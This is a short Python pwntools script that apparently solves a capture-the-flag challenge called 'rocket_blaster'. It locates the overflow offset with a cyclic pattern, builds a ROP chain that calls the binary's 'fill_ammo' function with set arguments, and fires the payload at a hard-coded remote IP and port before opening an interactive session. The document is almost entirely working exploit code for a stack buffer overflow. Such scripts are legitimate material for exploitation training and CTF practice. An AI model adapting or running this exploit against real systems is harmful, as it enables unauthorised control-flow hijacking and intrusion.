from pwn import *
exe = './rocket_blaster'
elf = context.binary = ELF(exe, checksec=True)
#context.log_level = 'debug'


info(hex(elf.symbols['fill_ammo']))

def findoffset(path,size,after):
    #target=process(path, stdin=PTY, stdout=PTY, stderr=PTY)
    target=process(path)
    target.sendlineafter(after, cyclic(size))
    target.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(target.corefile.read(target.corefile.sp, 4)) # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset
#findoffset(exe,300,'>>')

rop = ROP(elf)
#Write a ret gadget to avoid stack alignment issues.
rop.raw(rop.find_gadget(['ret'])[0])
rop.fill_ammo(0xdeadbeef,0xdeadbabe,0xdead1337)
info(rop.dump())
info(rop.chain())

payload = flat(
    {findoffset(exe,300,'>>'):rop.chain()}
)

io= remote("83.136.254.158",38356)
io.sendlineafter(b">> ", payload)
info(payload)
io.interactive()
